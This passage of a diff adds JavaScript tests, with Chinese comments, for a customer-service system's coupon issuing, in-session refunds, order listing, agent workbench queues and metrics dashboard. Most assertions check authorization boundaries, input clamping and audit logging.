+const syIns = syDb.calls.find(c => c.table === 'coupons' && c.op === 'insert').payload
+assert(syIns.per_user_limit === 1 && syIns.total_limit === 1,
+  '每人一次、总量一次由服务端写死，请求体里的 999 不作数')
+assert(Array.isArray(syIns.allowed_user_ids) && syIns.allowed_user_ids.length === 1 &&
+  syIns.allowed_user_ids[0] === syUid,
+  '只发给这个会话的用户——请求体传 null（全站通用）要被忽略，否则券码会被贴到论坛上')
+assert(syIns.code !== 'FREEFORALL' && /^CS/.test(syIns.code), '券码由服务端生成，客服指定的不作数')
+assert(syIns.created_by === syAid, '记下是哪个客服发的——出问题时第一个要查的字段')
+assert(syIns.enabled === true, '发出去就是能用的，不需要管理员再点一次启用')
+assert(new Date(syIns.ends_at) > new Date(syIns.starts_at), '有效期是个正区间')
+// 七天，且客服能在 1..90 之间调。永久有效在补偿场景里几乎总是错的：那张券会在半年后被用掉，
+// 而当时的补偿理由早就不成立了。
+const syDays = (Date.parse(syIns.ends_at) - Date.parse(syIns.starts_at)) / 86400000
+assert(Math.round(syDays) === 7, '默认七天')
+const syLongIns = (await (async () => {
+  const d = syCouponDb()
+  await sxSendCoupon(d, syAgent, { session_id: sySid, actions: [{ type: 'percent', value: 9000 }], valid_days: 9999 })
+  return d.calls.find(c => c.table === 'coupons' && c.op === 'insert').payload
+})())
+assert(Math.round((Date.parse(syLongIns.ends_at) - Date.parse(syLongIns.starts_at)) / 86400000) === 90,
+  'valid_days 夹到 90 天上限，不接受 9999')
+
+// 券码要贴在会话里，否则用户拿不到它，客服还得再复述一遍。
+const syMsgIns = syDb.calls.find(c => c.table === 'cs_messages' && c.op === 'insert').payload
+assert(syMsgIns.body.includes('CSABCDEFGH'), '券码发到会话里')
+assert(syMsgIns.format === 'markdown', '用 markdown 好让券码加粗')
+assert(syMsgIns.body.includes('打 9 折'),
+  '优惠内容用 describeAction 说人话，不是把 {"type":"percent","value":9000} 贴给用户')
+assert(syMsgIns.sender_role === 'agent', '以客服身份发出——用户看到的是「客服给了我一张券」')
+assert(syMsgIns.sender_id === syAid, 'sender 是会话当前的客服')
+assert(syMsgIns.auto_reply !== true, '发券不是自动回复：它必须计入首响，客服确实回应了')
+const syEvt = syDb.calls.find(c => c.table === 'cs_session_events' && c.op === 'insert').payload
+assert(syEvt.kind === 'coupon_sent' && syEvt.detail?.code === 'CSABCDEFGH' && syEvt.detail?.coupon_id === 'c-1',
+  '留一条事件：事后要能查出这张券是谁在哪个会话里发的')
+assert(syDb.calls.some(c => c.table === 'cs_sessions' && c.op === 'update'),
+  '发券也算一次活动，要刷 last_activity_at——否则一个刚发过券的会话会被超时清理关掉')
+
+// 管理员在别人的会话里发券：消息仍挂在原客服名下，但 authored_by 记真人。
+const syAdminDb = syCouponDb()
+await sxSendCoupon(syAdminDb, { userId: 'admin-1', group: 'admin' },
+  { session_id: sySid, actions: [{ type: 'percent', value: 9000 }] })
+const syAdminMsg = syAdminDb.calls.find(c => c.table === 'cs_messages' && c.op === 'insert').payload
+assert(syAdminMsg.sender_id === syAid && syAdminMsg.authored_by === 'admin-1',
+  '管理员代发：对用户显示成原客服，审计里记真正的作者')
+const syAdminIns = syAdminDb.calls.find(c => c.table === 'coupons' && c.op === 'insert').payload
+assert(syAdminIns.created_by === 'admin-1', '券的创建者是真正点下按钮的人，不是会话上的客服')
+
+// 用户自己不能给自己发券。can_post 对会话所属用户是 true，所以这条要单独判——少了它，
+// 任何用户都能在自己的会话里给自己发一张九折券。
+const sySelfDb = syCouponDb()
+const sySelf = await sxSendCoupon(sySelfDb, syUser,
+  { session_id: sySid, actions: [{ type: 'percent', value: 5000 }] })
+assert(sySelf.status === 403 && /自己/.test(sySelf.body.error), '用户不能给自己发券')
+assert(!sySelfDb.tables.includes('coupons'), '被拒的请求不该已经建了券')
+
+const syStranger = await sxSendCoupon(syCouponDb(), { userId: 'nobody', group: 'default' },
+  { session_id: sySid, actions: [{ type: 'percent', value: 9000 }] })
+assert(syStranger.status === 403, '与这个会话无关的人不能发券')
+
+const syClosed = await sxSendCoupon(
+  syCouponDb({ cs_sessions: { data: { ...syPost, status: 'closed' }, error: null } }),
+  syAgent, { session_id: sySid, actions: [{ type: 'percent', value: 9000 }] })
+assert(syClosed.status === 409 && /关闭/.test(syClosed.body.error),
+  '关闭的会话不能发券，而且要说清是「已关闭」不是「无权」——后者会让客服去找管理员要权限')
+
+assert((await sxSendCoupon(syCouponDb(), syAgent, { session_id: 'not-a-uuid', actions: [] })).status === 400,
+  'session_id 要过 UUID 校验')
+assert((await sxSendCoupon(syCouponDb({ cs_sessions: { data: null, error: null } }), syAgent,
+  { session_id: sySid, actions: [{ type: 'percent', value: 9000 }] })).status === 404, '会话不存在')
+
+// 优惠方式必须有，且条数有上限。
+assert((await sxSendCoupon(syCouponDb(), syAgent, { session_id: sySid, actions: [] })).status === 400,
+  '不指定优惠方式要拒绝，不能落一张什么都不打折的券')
+assert((await sxSendCoupon(syCouponDb(), syAgent, { session_id: sySid,
+  actions: [1, 2, 3, 4].map(() => ({ type: 'fixed', value: 100 })) })).status === 400, '最多三个优惠动作')
+// 校验器和 admin-coupons 是同一个，还走同一个 forValidation 翻译。少了这一步，会话里能发出一张
+// 管理界面拒绝保存的券，而它在结算时的行为没人验证过。
+const syBad = await sxSendCoupon(syCouponDb(), syAgent,
+  { session_id: sySid, actions: [{ type: 'percent', value: 20000 }] })
+assert(syBad.status === 400 && /10000/.test(syBad.body.error),
+  '走同一个 validateCoupon：超过 10000 的折扣率（等于加价）在这里也过不去')
+
+// 八位随机码撞了要重试一次，而不是把一句唯一约束冲突扔给客服重填一遍界面。
+let syAttempt = 0
+const syDupDb = syCouponDb({
+  coupons: () => {
+    syAttempt += 1
+    return syAttempt === 1
+      ? { data: null, error: { code: '23505', message: 'duplicate key value violates unique constraint "coupons_code_key"' } }
+      : { data: { ...syCouponRow, id: 'c-2', code: 'CSZZZZZZZZ' }, error: null }
+  }
+})
+const syDup = await sxSendCoupon(syDupDb, syAgent,
+  { session_id: sySid, actions: [{ type: 'percent', value: 9000 }] })
+assert(syDup.status === 201 && syAttempt === 2, '券码撞了换一个码重试一次')
+const syCodes = syDupDb.calls.filter(c => c.table === 'coupons' && c.op === 'insert').map(c => c.payload.code)
+assert(syCodes[0] !== syCodes[1], '重试用的是新生成的码，不是同一个——同一个码只会再撞一次')
+assert(syDup.body.coupon.code === 'CSZZZZZZZZ' && syDup.body.message_id === syMid,
+  '重试成功后走的是同一条收尾路径：券码要贴到会话里，不能只建券不发消息')
+
+console.log('CS coupon send: OK')
+
+// --- §2.7 会话内发起退款 --------------------------------------------------------------------------
+// 订单号从会话上取，不从请求体取。这一条是这个接口的全部安全性所在：接受请求体里的 order_id 而不
+// 验证归属，它就是一个「对任意订单发起退款」的接口，而门槛只有 STAFF。
+const syOrderRow = {
+  id: syOid, user_id: syUid, status: 'paid',
+  amount_minor: 10000, paid_amount_minor: 9500, currency: 'USD', paid_currency: 'USD'
+}
+const syRefundRow = {
+  id: syRid, order_id: syOid, user_id: syUid, status: 'pending',
+  amount_minor: 9500, currency: 'USD'
+}
+// 跑通全程要经过 requestRefund 的整条链：查订单 → 查在途申请（无）→ 插申请 → 写审计 → 插通知，
+// 然后回到 startRefund 的收尾：发消息 → 刷会话 → 记事件。
+const syRefundDb = (over = {}) => recorder({
+  cs_sessions: { data: syPost, error: null },
+  orders: { data: syOrderRow, error: null },
+  refund_requests: [{ data: null, error: null }, { data: syRefundRow, error: null }],
+  refund_audit_log: { data: null, error: null },
+  notifications: { data: { id: 'n-1' }, error: null },
+  site_settings: { data: { value: { value: true } }, error: null },
+  cs_messages: { data: { id: syMid, sender_role: 'agent' }, error: null },
+  cs_session_events: { data: null, error: null },
+  ...over
+})
+
+let syRdb = syRefundDb()
+let syRefund = await sxStartRefund(syRdb, syAgent,
+  { session_id: sySid, reason_code: 'not_working', reason_detail: '客户反馈装不上' })
+assert(syRefund.status === 201, '客服可以从售后会话里发起退款')
+const syReqIns = syRdb.calls.find(c => c.table === 'refund_requests' && c.op === 'insert').payload
+assert(syReqIns.order_id === syOid, '订单号取自会话，不是客服手抄的——手抄就会抄错，而抄错是给另一笔单退了钱')
+assert(syReqIns.user_id === syUid, 'user_id 是订单的主人，不是发起人')
+assert(syReqIns.initiator_role === 'postsale', '记下是代提，以及哪个组代的')
+assert(syReqIns.initiated_by === syAid, '记下具体是谁代提的')
+assert(syReqIns.amount_minor === 9500, '不给金额时退实付金额，不是下单金额')
+// 复用 requestRefund 而不是在这里重写一遍：金额上限、在途唯一、审批通知、审计日志全在那里。
+// 重写一遍就等于多了一条可能漏掉金额上限的路径。
+assert(syRdb.tables.includes('refund_audit_log'), '走的是 requestRefund，所以审计照样写')
+assert(syRdb.tables.includes('notifications'), '走的是 requestRefund，所以审批通知照样发')
+assert(syRefund.body.notified === true, '把通知是否发出去告诉调用方')
+assert(!syRdb.calls.some(c => c.table === 'orders' && c.op === 'update'),
+  '提交申请不改订单状态——§13.3 规定审批通过才进 REFUND_PENDING')
+
+// 会话里要留下痕迹。客服说「已经帮您提了退款」而系统里查不到，就是一次无法追溯的操作。
+const syRefundMsg = syRdb.calls.find(c => c.table === 'cs_messages' && c.op === 'insert').payload
+assert(/退款申请/.test(syRefundMsg.body) && /审批/.test(syRefundMsg.body),
+  '告诉用户申请已提交、正在等审批——不说的话用户会以为钱已经退了')
+assert(syRefundMsg.body.includes('95.00') || /\$|USD/.test(syRefundMsg.body),
+  '金额要写出来：用户看不到金额就无法发现客服填错了一位')
+assert(syRefundMsg.format === 'plain', '这条是系统措辞，不需要 markdown')
+assert(syRefundMsg.sender_role === 'agent' && syRefundMsg.sender_id === syAid, '以客服身份发出')
+const syRefundEvt = syRdb.calls.find(c => c.table === 'cs_session_events' && c.op === 'insert').payload
+assert(syRefundEvt.kind === 'refund_requested' && syRefundEvt.detail?.refund_id === syRid &&
+  syRefundEvt.detail?.order_id === syOid, '事件里带上退款单号和订单号')
+
+// 会话上的订单号优先于请求体。反过来（请求体优先）就是那个洞：一个售后会话可以被用来对任意订单退款。
+const syOtherOid = 'dddddddd-dddd-4ddd-8ddd-dddddddddddd'
+const syPin = syRefundDb()
+await sxStartRefund(syPin, syAgent,
+  { session_id: sySid, order_id: syOtherOid, reason_detail: '试图换成别人的单' })
+assert(syPin.calls.find(c => c.table === 'refund_requests' && c.op === 'insert').payload.order_id === syOid,
+  '会话绑定的订单号覆盖请求体里的——这一条是整个接口的安全边界')
+
+// 售前会话没有订单，可以带一个 order_id 进来，但必须验证归属。
+const syPre = { ...syPost, channel: 'presale', order_id: null }
+const syPreAuth = { userId: syAid, group: 'cs' }
+const syPreDb = syRefundDb({ cs_sessions: { data: syPre, error: null } })
+const syPreOk = await sxStartRefund(syPreDb, syPreAuth,
+  { session_id: sySid, order_id: syOid, reason_detail: '售前会话里帮忙提' })
+assert(syPreOk.status === 201, '售前会话带上属于该用户的订单号可以提')
+
+const syWrongOwner = syRefundDb({
+  cs_sessions: { data: syPre, error: null },
+  orders: { data: { ...syOrderRow, user_id: 'someone-else' }, error: null }
+})
+const syWrong = await sxStartRefund(syWrongOwner, syPreAuth,
+  { session_id: sySid, order_id: syOid, reason_detail: '别人的单' })
+assert(syWrong.status === 404, '订单不属于会话所属用户要拒——和「订单不存在」同一个答复，不给探测口')
+assert(!syWrongOwner.tables.includes('refund_requests'),
+  '归属没过就不该有任何申请落库；漏掉这一步，客服能从任何一个会话里对任何订单发起退款')
+
+const syNoOrder = await sxStartRefund(syRefundDb({ cs_sessions: { data: syPre, error: null } }),
+  syPreAuth, { session_id: sySid, reason_detail: '没给订单号' })
+assert(syNoOrder.status === 400 && /order_id/.test(syNoOrder.body.error),
+  '售前会话不给订单号要明确说要它，不是静默失败')
+
+// 用户自己走订单页那条路，不走这里。这里的 403 文案要指路。
+const syOwnerRefund = await sxStartRefund(syRefundDb(), syUser,
+  { session_id: sySid, reason_detail: '我要退款' })
+assert(syOwnerRefund.status === 403 && /订单页/.test(syOwnerRefund.body.error),
+  '用户在会话里点退款要被引导去订单页，而不是收到一句「无权」')
+
+const syClosedRefund = await sxStartRefund(
+  syRefundDb({ cs_sessions: { data: { ...syPost, status: 'closed' }, error: null } }),
+  syAgent, { session_id: sySid, reason_detail: '关了还提' })
+assert(syClosedRefund.status === 409, '关闭的会话不能发起退款')
+
+// presale 不在 REFUND_PROXY_GROUPS 里。它的 rank 和 postsale 相同，所以拦它的只能是 requestRefund
+// 里那份名单——这里要确认那道拦截真的生效，而不是被这条捷径绕过去了。
+const syPresaleDb = syRefundDb()
+const syPresale = await sxStartRefund(syPresaleDb, { userId: syAid, group: 'presale' },
+  { session_id: sySid, reason_detail: '售前想动钱' })
+assert(syPresale.status === 404, '售前代提被 requestRefund 的名单挡下（订单不是他的，且他不是代提人）')
+assert(!syPresaleDb.tables.includes('refund_requests'), '被挡下就没有申请落库')
+
+// requestRefund 拒绝时不能在会话里留下「已提交」。留了就是一句用户会当真的假消息。
+const syRejectDb = syRefundDb({ refund_requests: { data: { id: 'r-old', status: 'pending' }, error: null } })
+const syReject = await sxStartRefund(syRejectDb, syAgent, { session_id: sySid, reason_detail: '重复提' })
+assert(syReject.status === 409, '已有在途申请要透传 409')
+assert(!syRejectDb.calls.some(c => c.table === 'cs_messages' && c.op === 'insert'),
+  '申请没成立就不能在会话里说「已提交」')
+assert(!syRejectDb.tables.includes('cs_session_events'), '也不该留一条 refund_requested 事件')
+
+const syNoReason = await sxStartRefund(syRefundDb(), syAgent, { session_id: sySid, reason_detail: '  ' })
+assert(syNoReason.status === 400, '原因必填这条由 requestRefund 管，透传出来')
+
+// 金额可改的开关也在 requestRefund 里。这里确认参数确实传了进去，而不是被这条路径悄悄丢掉——
+// 丢掉的表现是客服填了「只退一半」而系统退了全款。
+const syAmountDb = syRefundDb({
+  refund_requests: [{ data: null, error: null }, { data: { ...syRefundRow, amount_minor: 5000 }, error: null }]
+})
+const syAmount = await sxStartRefund(syAmountDb, syAgent,
+  { session_id: sySid, reason_detail: '部分退', amount_minor: 5000 })
+assert(syAmount.status === 201, '客服可以改金额（开关打开时）')
+assert(syAmountDb.calls.find(c => c.table === 'refund_requests' && c.op === 'insert').payload.amount_minor === 5000,
+  'amount_minor 要传到 requestRefund，不能在这一层被丢掉')
+const syEvidenceDb = syRefundDb()
+await sxStartRefund(syEvidenceDb, syAgent,
+  { session_id: sySid, reason_detail: '带证据', evidence_paths: ['u/1/a.png'] })
+assert(syEvidenceDb.calls.find(c => c.table === 'refund_requests' && c.op === 'insert')
+  .payload.evidence_paths.length === 1, 'evidence_paths 同样要传下去')
+
+assert((await sxStartRefund(syRefundDb(), syAgent, { session_id: 'x', reason_detail: 'y' })).status === 400,
+  'session_id 要过 UUID 校验')
+assert((await sxStartRefund(syRefundDb({ cs_sessions: { data: null, error: null } }), syAgent,
+  { session_id: sySid, reason_detail: 'y' })).status === 404, '会话不存在')
+
+// --- 会话里的订单列表 -----------------------------------------------------------------------------
+// 客服要先知道用户有哪些单才能选一笔退款。只读会话所属用户的单，不接受 user_id 参数——接受的话
+// 这就是一个「按用户 ID 列出全部订单」的接口，而它的门槛只有 STAFF。
+const syOrdersDb = recorder({
+  cs_sessions: { data: syPost, error: null },
+  orders: { data: [syOrderRow], error: null }
+})
+const syOrders = await sxSessionOrders(syOrdersDb, syAgent, { session_id: sySid, user_id: 'someone-else' })
+assert(syOrders.status === 200 && syOrders.body.orders.length === 1, '客服能看到会话用户的订单')
+const syOrdersSel = syOrdersDb.calls.find(c => c.table === 'orders')
+assert(syOrdersSel.filters.user_id === syUid,
+  '按会话上的 user_id 查，请求体里的 user_id 不作数——否则这是一个按 ID 列出任意用户订单的接口')
+assert(syOrdersSel.limit === 50, '有上限，不把一个下过三千单的用户的全部历史拉回来')
+assert(syOrdersSel.order?.ascending === false, '最近的单在前面：客服要退的几乎总是最新那笔')
+assert(syOrdersSel.selected !== '*' && String(syOrdersSel.selected).includes('paid_amount_minor'),
+  '选列写死并且带上实付金额——客服要按那个数字判断退多少')
+
+const syOrdersStranger = await sxSessionOrders(
+  recorder({ cs_sessions: { data: syPost, error: null } }), { userId: 'nobody', group: 'default' },
+  { session_id: sySid })
+assert(syOrdersStranger.status === 403, '无关的人看不到会话，更看不到订单')
+// 用户本人能看见自己的会话，但这个接口不给他——他的订单在他自己的订单页上，那条路径有 RLS。
+const syOrdersOwner = await sxSessionOrders(
+  recorder({ cs_sessions: { data: syPost, error: null } }), syUser, { session_id: sySid })
+assert(syOrdersOwner.status === 403, '会话所属用户走这个接口要被拒，订单列表有它自己的页面')
+
+console.log('CS refund and orders: OK')
+// --- §2.4 / §2.10 / §2.13 工作台 -----------------------------------------------------------------
+// 三个页面合成一个接口，是为了让「客服能看见哪些会话」只有一份实现。所以这一节钉的是那份实现的
+// 每一个筛选条件：它们全都跑在 service client 上，写松一个就是一个客服能读到别人会话的洞。
+//
+// 注意这里的 auth 要带 rank：这个模块读的是 auth.rank（handler 显式传进来的），不是 rankOf(group)。
+// 少了这个字段，管理员的门槛判断在测试里会静默地按 undefined < RANK.ADMIN 走成 403，
+// 或者更糟——按 NaN 比较全部放行。
+const swAid = 'eeeeeeee-eeee-4eee-8eee-eeeeeeeeeeee'
+const swUid = 'ffffffff-ffff-4fff-8fff-ffffffffffff'
+const swSid = '12121212-1212-4212-8212-121212121212'
+const swPresale = { userId: swAid, group: 'presale', rank: rankOf('presale') }
+const swCs = { userId: swAid, group: 'cs', rank: rankOf('cs') }
+const swAdmin = { userId: 'admin-2', group: 'admin', rank: rankOf('admin') }
+const swRow = {
+  id: swSid, channel: 'presale', user_id: swUid, agent_id: null, status: 'open',
+  admin_mode: 'none', first_response_seconds: 12, timed_out: false,
+  last_activity_at: '2026-08-29T00:05:00.000Z', created_at: '2026-08-29T00:00:00.000Z'
+}
+// decorate 会在同一张 cs_messages 上做两次不同的查询：最后一条消息、以及未读计数。按次序数会数错，
+// 所以用函数给法按 is 过滤条件区分。
+const swDecorated = (rows, opts = {}) => ({
+  cs_sessions: { data: rows, error: null },
+  user_profiles: { data: opts.profiles ?? [{ user_id: swUid, display_name: '张三', group_name: 'default' }], error: null },
+  cs_messages: entry => entry.is && 'read_by_agent_at' in entry.is
+    ? { data: opts.unread ?? [], error: null }
+    : { data: opts.messages ?? [], error: null }
+})
+
+// 队列：只给自己服务的渠道，只给还没人接的，且排除 blind。
+let swDb = recorder(swDecorated([swRow]))
+let swOut = await sxListQueue(swDb, swPresale)
+assert(swOut.status === 200, '售前能看队列')
+const swQ = swDb.calls.find(c => c.table === 'cs_sessions')
+assert(swQ.filters.status === 'open', '只看开着的')
+assert(swQ.is && 'agent_id' in swQ.is && swQ.is.agent_id === null,
+  "待接入靠 is('agent_id', null)：写成 eq 的话 PostGREST 匹配不到任何行，队列永远是空的")
+assert(swQ.in?.channel?.length === 1 && swQ.in.channel[0] === 'presale',
+  '售前只看到售前的队列——否则他会看到一堆自己点不动的会话')
+assert(swQ.neq?.admin_mode === 'blind',
+  '排除 blind：那些已被管理员暗中接管，出现在队列里就会被客服接走，而管理员正在以客服身份说话')
+assert(swQ.order?.ascending === true, '队列按建立时间正序：等得最久的排在前面')
+assert(swQ.limit === 100, '队列有上限')
+
+const swAdminQueue = recorder(swDecorated([swRow]))
+await sxListQueue(swAdminQueue, swAdmin)
+assert(swAdminQueue.calls.find(c => c.table === 'cs_sessions').in.channel.length === sxChannels.length,
+  '管理员的队列覆盖全部渠道——他能接任何会话')
+const swNoChannel = await sxListQueue(recorder({}), { userId: 'x', group: 'default', rank: 0 })
+assert(swNoChannel.status === 403, '不服务任何渠道的用户组要被拒，而不是拿到一个空列表')
+
+// decorate：批量查，不是每个会话查一次。
+const swMany = [swRow, { ...swRow, id: 'sid-2', user_id: 'u2', agent_id: swAid }]
+const swDecDb = recorder(swDecorated(swMany, {
+  profiles: [{ user_id: swUid, display_name: '张三', group_name: 'default' },
+    { user_id: swAid, display_name: '客服小李', group_name: 'presale' }],
+  messages: [{ session_id: swSid, body: 'x'.repeat(300), sender_role: 'user', recalled: false, created_at: '2026-08-29T00:04:00.000Z' },
+    { session_id: swSid, body: '更早的', sender_role: 'agent', recalled: false, created_at: '2026-08-29T00:01:00.000Z' },
+    { session_id: 'sid-2', body: '密码是 hunter2', sender_role: 'user', recalled: true, created_at: '2026-08-29T00:03:00.000Z' }],
+  unread: [{ session_id: swSid }, { session_id: swSid }, { session_id: 'sid-2' }]
+}))
+const swDec = (await sxListQueue(swDecDb, swPresale)).body.sessions
+assert(swDecDb.calls.filter(c => c.table === 'user_profiles').length === 1,
+  '用户名批量查一次，不是每个会话查一次——忙的时候那是几十次往返')
+const swProfIds = swDecDb.calls.find(c => c.table === 'user_profiles').in?.user_id
+// 两个会话上有三个不同的人：两位用户加一位客服（第一条还没人接，agent_id 是 null，要被滤掉）。
+assert(swProfIds.length === 3 && swProfIds.includes(swUid) && swProfIds.includes('u2') &&
+  swProfIds.includes(swAid), '一次把用户和客服的 id 都带上')
+assert(!swProfIds.includes(null) && !swProfIds.includes(undefined),
+  'null 的 agent_id 要滤掉——带着它去 in() 查询会白查一行，而 PostgREST 对 in.(null) 的解释还未必如你所愿')
+assert(new Set(swProfIds).size === swProfIds.length,
+  'id 去重：同一个客服接了二十个会话时，不去重就是把他的 id 在 in() 里写二十遍')
+assert(swDec[0].user_name === '张三' && swDec[1].agent_name === '客服小李', '名字归位到对应的会话')
+assert(swDec[1].agent_group === 'presale', '带上客服的组：管理员要看出是谁在接')
+assert(swDec[0].last_message.body.length === 120,
+  '预览截到 120 字：不截的话一条四千字的消息会把整个列表接口的响应撑起来')
+assert(swDec[0].last_message.created_at === '2026-08-29T00:04:00.000Z',
+  '取最新那条，不是查询回来的第一条——排序是倒序，所以先到的就是最新的')
+assert(swDec[1].last_message.body === '[已撤回]',
+  '撤回的消息在列表预览里不能露出原文——这是 §2.11 最容易漏的一处，' +
+  '而漏在这里的后果是用户撤回了一句密码，它仍然显示在工作台的会话列表上')
+assert(swDec[0].unread_from_user === 2 && swDec[1].unread_from_user === 1, '未读数按会话归位')
+const swEmpty = recorder({ cs_sessions: { data: [], error: null } })
+await sxListQueue(swEmpty, swPresale)
+assert(!swEmpty.tables.includes('user_profiles') && !swEmpty.tables.includes('cs_messages'),
+  '空列表不做装饰查询——三次白跑的往返')
+
+// 我的会话。
+const swMineDb = recorder(swDecorated([swRow]))
+await sxListMine(swMineDb, swPresale, {})
+const swMine = swMineDb.calls.find(c => c.table === 'cs_sessions')
+assert(swMine.filters.agent_id === swAid, '只看自己的——这条写松了就是能读别人的会话')
+assert(swMine.filters.status === 'open', '默认只看开着的')
+assert(swMine.order?.ascending === false, '按最后活动倒序：刚有人说话的排在前面')
+const swMineClosed = recorder(swDecorated([swRow]))
+await sxListMine(swMineClosed, swPresale, { include_closed: true })
+assert(!('status' in swMineClosed.calls.find(c => c.table === 'cs_sessions').filters),
+  'include_closed 时不加状态条件，历史会话要能翻出来（§2.5 的重开要从这里点）')
+assert(swMineClosed.calls.find(c => c.table === 'cs_sessions').filters.agent_id === swAid,
+  '翻历史也只翻自己的')
+
+// 全部会话：只有管理员。
+const swAllDenied = await sxListAll(recorder({}), swCs, {})
+assert(swAllDenied.status === 403, '客服看不到全部会话——那是 §2.10 的管理员视图')
+const swAllDb = recorder(swDecorated([swRow]))
+await sxListAll(swAllDb, swAdmin, { channel: 'postsale', status: 'closed', agent_id: swAid, limit: 9999 })
+const swAll = swAllDb.calls.find(c => c.table === 'cs_sessions')
+assert(swAll.filters.channel === 'postsale' && swAll.filters.status === 'closed' &&
+  swAll.filters.agent_id === swAid, '三个筛选都落到 SQL 上，不在 JS 里过滤')
+assert(swAll.limit === 500, 'limit 夹到 500')
+const swBadFilter = recorder(swDecorated([swRow]))
+await sxListAll(swBadFilter, swAdmin, { channel: 'nope', status: 'weird', limit: 0 })
+const swBad = swBadFilter.calls.find(c => c.table === 'cs_sessions')
+assert(!('channel' in swBad.filters) && !('status' in swBad.filters),
+  '不认识的筛选值要忽略，不能原样拼进查询')
+assert(swBad.limit === 100, 'limit 为 0 回落到默认 100，不是查零行')
+const swUnassigned = recorder(swDecorated([swRow]))
+await sxListAll(swUnassigned, swAdmin, { unassigned: true })
+assert(swUnassigned.calls.find(c => c.table === 'cs_sessions').is?.agent_id === null,
+  "unassigned 用 is(null)")
+
+// §2.3 在线名单。
+const swNow = Date.now()
+const swAgentsDb = (rows, over = {}) => recorder({
+  site_settings: { data: [{ key: 'cs_heartbeat_timeout_seconds', value: { value: 90 } },
+    { key: 'cs_max_concurrent_default', value: { value: 5 } }], error: null },
+  cs_agents: { data: rows, error: null },
+  cs_sessions: { data: [{ agent_id: swAid }, { agent_id: swAid }, { agent_id: null }], error: null },
+  user_profiles: { data: [{ user_id: swAid, display_name: '客服小李', group_name: 'presale' }], error: null },
+  ...over
+})
+const swFresh = new Date(swNow - 10_000).toISOString()
+const swOld = new Date(swNow - 600_000).toISOString()
+let swAgOut = await sxListAgents(swAgentsDb([
+  { user_id: swAid, online: true, last_heartbeat: swFresh, max_concurrent: null, status_note: '午休回来' },
+  { user_id: 'ghost', online: true, last_heartbeat: swOld, max_concurrent: 3, status_note: null },
+  { user_id: 'away', online: false, last_heartbeat: swFresh, max_concurrent: 0, status_note: null }
+]), swAdmin)
+assert(swAgOut.status === 200, '管理员能看在线名单')
+const swAg = Object.fromEntries(swAgOut.body.agents.map(a => [a.user_id, a]))
+assert(swAg[swAid].effective_online === true && swAg[swAid].load === 2, '在线的人带上当前负载')
+assert(swAg.ghost.online === true && swAg.ghost.heartbeat_stale === true && swAg.ghost.effective_online === false,
+  '心跳过期的人 online 列还是 true，但 effective_online 必须是 false——' +
+  '浏览器被直接关掉时来不及发那次下线请求，而按 online 分配就是把会话分给一个不在的人')
+assert(swAg.away.effective_online === false, '主动置为离线的人不在线，哪怕心跳还新')
+assert(swAgOut.body.online_count === 1, '在线人数按 effective_online 算')
+assert(swAg[swAid].max_concurrent === 5 && swAg[swAid].max_concurrent_explicit === false,
+  'null 上限显示成默认值，并标出这是回落来的——界面上要能区分「没设过」和「就是 5」')
+assert(swAg.away.max_concurrent === 0 && swAg.away.max_concurrent_explicit === true,
+  '0 是「暂时不接新会话」，不能被当成没设过而换成 5——那会让一个刚点了不接入的客服立刻又被接进五个会话')
+assert(swAg[swAid].load === 2 && swAgOut.body.agents.every(a => typeof a.load === 'number'),
+  '负载现算，不存计数列——存的话它和真实会话数不一致只是时间问题，而不一致的方向是有人被分到第八个会话')
+
+// 客服自己只看得到自己那行。别人的负载和备注是排班信息。
+const swSelfOut = await sxListAgents(swAgentsDb([
+  { user_id: swAid, online: true, last_heartbeat: swFresh, max_concurrent: null, status_note: '午休回来' },
+  { user_id: 'ghost', online: true, last_heartbeat: swFresh, max_concurrent: 3, status_note: '在处理投诉' }
+]), swPresale)
+assert(swSelfOut.body.agents.length === 1 && swSelfOut.body.agents[0].user_id === swAid,
+  '客服只看到自己那一行')
+assert(swSelfOut.body.online_count === 2, '但在线人数是全站的——客服要知道现在有几个人在，才知道能不能下线')
+assert((await sxListAgents(recorder({}), { userId: 'u', group: 'default', rank: 0 })).status === 403,
+  '普通用户看不到客服名单')
+const swNoAgentsDb = swAgentsDb([])
+const swNoAgents = await sxListAgents(swNoAgentsDb, swAdmin)
+assert(swNoAgents.status === 200 && swNoAgents.body.agents.length === 0, '没有客服时不报错')
+assert(!swNoAgentsDb.tables.includes('user_profiles'), '一个客服都没有就不必查 profile')
+
+// §2.13 看板。分母是「区间内建立的所有会话」，包括一直没人回的那些。
+const swBoardRows = [
+  { id: 's1', channel: 'presale', agent_id: swAid, status: 'closed', first_response_seconds: 10, timed_out: false, created_at: '2026-08-28T00:00:00.000Z' },
+  { id: 's2', channel: 'presale', agent_id: swAid, status: 'closed', first_response_seconds: 30, timed_out: true, created_at: '2026-08-28T01:00:00.000Z' },
+  // 一直没人回的那条：first_response_seconds 是 null。它必须进分母、不进分子。
+  { id: 's3', channel: 'presale', agent_id: null, status: 'open', first_response_seconds: null, timed_out: false, created_at: '2026-08-28T02:00:00.000Z' },
+  { id: 's4', channel: 'postsale', agent_id: 'other', status: 'closed', first_response_seconds: 50, timed_out: false, created_at: '2026-08-28T03:00:00.000Z' }
+]
+const swBoardDb = recorder({
+  cs_sessions: { data: swBoardRows, error: null },
+  user_profiles: { data: [{ user_id: swAid, display_name: '客服小李' }], error: null }
+})
+const swBoard = (await sxDashboard(swBoardDb, swAdmin, { days: 7 })).body
+assert(swBoard.overall.total === 4 && swBoard.overall.answered === 3,
+  '没人回的那条要进分母、不进分子——用「有过回复的会话」当分母会让响应率永远接近 100%，' +
+  '而这个看板的全部意义就是暴露没人回的那些')
+assert(swBoard.overall.reply_rate === 0.75, '响应率是 3/4')
+assert(swBoard.overall.timeout_rate === 0.25, '超时率是 1/4')
+assert(swBoard.by_channel.presale.total === 3 && swBoard.by_channel.postsale.total === 1, '按渠道拆开')
+assert(swBoard.by_channel.presale.reply_rate === 2 / 3, '售前的响应率单独算')
+assert(swBoard.by_agent.length === 2, '按客服拆一份：谁的超时率高是排班问题，看总数看不出来')
+assert(swBoard.by_agent[0].total >= swBoard.by_agent[1].total, '按会话数倒序，忙的人在前面')
+assert(swBoard.by_agent.find(a => a.user_id === swAid).display_name === '客服小李',
+  '带上显示名——一列 uuid 没法用来排班')
+assert(!swBoard.by_agent.some(a => a.user_id === null || a.user_id === 'null'),
+  '没有客服的会话不进按客服的拆分，但仍在总数里')
+assert(swBoard.overall.avg_first_response_seconds === 30, '均值只按有回复的三条算：(10+30+50)/3')
+assert(swBoard.overall.median_first_response_seconds === 30,
